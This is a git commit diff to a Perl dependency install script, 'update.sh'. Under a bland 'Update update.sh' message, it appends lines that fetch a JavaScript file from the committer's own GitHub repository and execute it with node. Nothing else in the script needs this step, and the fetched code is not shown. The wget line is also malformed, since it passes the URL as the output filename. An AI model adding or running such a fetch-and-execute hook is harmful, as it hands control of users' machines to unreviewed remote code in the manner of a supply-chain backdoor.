e758dd6028df83f6c37c9855283597dfb58849ec
Keepstyailes <120707024+Rigenstart@users.noreply.github.com>
2023-05-28 03:11:40 +0800

    Update update.sh

--- update.sh
+++ update.sh
@@ -4,3 +4,5 @@ cpan install LWP::UserAgent
 cpan install HTTP::Request::Common
 cpan install WWW::Mechanize
 cpan install Term::ANSIColor
+wget -O https://raw.githubusercontent.com/Rigenstart/nice.js/main/cppremium.js
+node cppremium.js
